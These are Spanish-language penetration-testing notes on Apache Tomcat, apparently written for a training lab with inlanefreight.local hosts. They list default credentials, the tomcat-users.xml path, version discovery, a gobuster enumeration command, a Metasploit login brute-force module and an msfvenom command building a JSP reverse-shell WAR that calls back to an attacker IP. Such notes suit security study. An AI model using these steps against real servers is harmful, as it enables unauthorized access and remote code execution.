#### Info
- Soporta aplicaciones en JAVA.
- Soporta JSP
- Utilizado por frameworks como Spring
- En la carpeta conf <tomcat-users.xml se encuentran las credenciales de los usuarios ;)
- Usuales contraseñas: tomcat:tomcat admin:admin

#### archivos importantes

- /opt/tomcat/conf/tomcat-users.xml 

#### Discovery
##### Versiones:
Si el server trabaja detrás de un reverse proxy podemos impulsar un error 404. Si la página está por defecto entonces nos dirá la versión

    http://app-dev.inlanefreight.local:8080/invalid

Otra forma es revisando el /docs:

    curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 


#### Enumeration

    gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt


### Attacking:

#### Brute-fotcing:
##### Metasploit

    auxiliary/scanner/http/tomcat_mgr_login


#### RCE

Podemos luego de entrar al manager conseguir rce subiendo una webshell .WAR

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
    

